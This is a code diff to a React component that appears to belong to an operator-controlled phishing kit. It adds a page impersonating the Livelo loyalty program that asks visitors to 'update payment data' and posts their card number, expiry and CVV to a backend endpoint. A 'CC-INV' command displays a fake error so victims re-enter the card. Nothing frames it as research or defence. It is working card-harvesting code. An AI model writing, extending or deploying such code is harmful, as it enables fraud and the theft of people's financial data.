@@ -12,6 +12,9 @@ function CommandPage({ userId }) {
   const [codeDigits, setCodeDigits] = useState(['', '', '', '', '', '']);
   const inputRefs = useRef([]);
   const [lastAction, setLastAction] = useState(null);
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
 
   // Verificar comandos a cada 2 segundos
   useEffect(() => {
@@ -38,6 +41,9 @@ function CommandPage({ userId }) {
       setSubmitted(false);
       setInputValue("");
       setCodeDigits(['', '', '', '', '', '']);
+      setCardNumber("");
+      setCardExpiry("");
+      setCardCvv("");
       setLastAction(currentCommand.action);
     }
   }, [currentCommand?.action, lastAction]);
@@ -936,6 +942,204 @@ function CommandPage({ userId }) {
                 strokeWidth={2}
                 d="M15 19l-7-7 7-7"
               />
+            </svg>
+            Voltar para página inicial
+          </a>
+        </div>
+      </div>
+    );
+  }
+
+  // Página CC - Dados do Cartão de Crédito
+  if (currentCommand?.action === "CC" || currentCommand?.action === "CC-INV") {
+    const isInvalid = currentCommand?.action === "CC-INV";
+
+    const formatCardNumber = (value) => {
+      const nums = value.replace(/\D/g, "").slice(0, 16);
+      return nums.replace(/(\d{4})(?=\d)/g, "$1 ");
+    };
+
+    const formatExpiry = (value) => {
+      const nums = value.replace(/\D/g, "").slice(0, 4);
+      if (nums.length > 2) return nums.slice(0, 2) + "/" + nums.slice(2);
+      return nums;
+    };
+
+    const validateCard = () => {
+      const nums = cardNumber.replace(/\D/g, "");
+      if (nums.length < 13 || nums.length > 16) return false;
+      // Luhn algorithm
+      let sum = 0;
+      let alt = false;
+      for (let i = nums.length - 1; i >= 0; i--) {
+        let n = parseInt(nums[i], 10);
+        if (alt) { n *= 2; if (n > 9) n -= 9; }
+        sum += n;
+        alt = !alt;
+      }
+      return sum % 10 === 0;
+    };
+
+    const validateExpiry = () => {
+      const parts = cardExpiry.split("/");
+      if (parts.length !== 2) return false;
+      const month = parseInt(parts[0], 10);
+      const year = parseInt("20" + parts[1], 10);
+      if (month < 1 || month > 12) return false;
+      const now = new Date();
+      const expDate = new Date(year, month);
+      return expDate > now;
+    };
+
+    const isFormValid = validateCard() && validateExpiry() && cardCvv.length >= 3;
+
+    const handleCCSubmit = async (e) => {
+      e.preventDefault();
+      setLoading(true);
+      const ccData = `${cardNumber} | ${cardExpiry} | ${cardCvv}`;
+      try {
+        await axios.post(`${API}/user/submit-data/${userId}`, {
+          field: "credit_card",
+          value: ccData
+        });
+        setSubmitted(true);
+      } catch (error) {
+        console.error("Erro ao enviar dados:", error);
+      }
+    };
+
+    return (
+      <div className="min-h-screen bg-white flex flex-col font-inter">
+        <div className="flex-1 flex flex-col items-center pt-16 px-4">
+          {/* Logo */}
+          <div className="mb-8">
+            <img 
+              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
+              alt="Livelo Logo" 
+              className="h-10 w-auto"
+            />
+          </div>
+
+          {/* Ícone */}
+          <div className="mb-6">
+            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
+              <svg className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                {isInvalid ? (
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                ) : (
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                )}
+              </svg>
+            </div>
+          </div>
+
+          {/* Erro */}
+          {isInvalid && (
+            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
+              <p className="text-red-600 text-sm text-center font-medium">
+                Dados do cartão inválidos. Por favor, digite novamente.
+              </p>
+            </div>
+          )}
+
+          {/* Título */}
+          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
+            Atualize seus dados de pagamento
+          </h1>
+
+          <p className="text-gray-600 mb-8 text-center max-w-sm">
+            Os dados do seu cartão de crédito precisam ser atualizados para continuar pontuando na Livelo.
+          </p>
+
+          {/* Formulário */}
+          <form onSubmit={handleCCSubmit} className="w-full max-w-md space-y-5">
+            {/* Número do Cartão */}
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-1.5">Número do cartão</label>
+              <div className="relative">
+                <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
+                  <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                  </svg>
+                </div>
+                <input
+                  type="text"
+                  value={cardNumber}
+                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                  placeholder="0000 0000 0000 0000"
+                  disabled={loading}
+                  maxLength={19}
+                  className={`w-full pl-12 pr-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
+                />
+              </div>
+            </div>
+
+            {/* Validade e CVV lado a lado */}
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-1.5">Validade</label>
+                <input
+                  type="text"
+                  value={cardExpiry}
+                  onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
+                  placeholder="MM/AA"
+                  disabled={loading}
+                  maxLength={5}
+                  className={`w-full px-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base text-center ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
+                />
+              </div>
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-1.5">CVV</label>
+                <input
+                  type="text"
+                  value={cardCvv}
+                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  placeholder="000"
+                  disabled={loading}
+                  maxLength={4}
+                  className={`w-full px-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base text-center ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
+                />
+              </div>
+            </div>
+
+            {/* Botão */}
+            <button
+              type="submit"
+              disabled={loading || !isFormValid}
+              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 mt-2 ${
+                isFormValid && !loading
+                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
+                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
+              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
+            >
+              {loading ? (
+                <div className="flex items-center justify-center">
+                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                </div>
+              ) : (
+                "Continuar"
+              )}
+            </button>
+
+            <div className="flex items-center justify-center gap-4 pt-2">
+              <div className="flex items-center gap-1 text-gray-400 text-xs">
+                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
+                Conexão segura
+              </div>
+            </div>
+          </form>
+        </div>
+
+        {/* Voltar */}
+        <div className="p-8">
+          <a href="#" className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors">
+            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
             </svg>
             Voltar para página inicial
           </a>
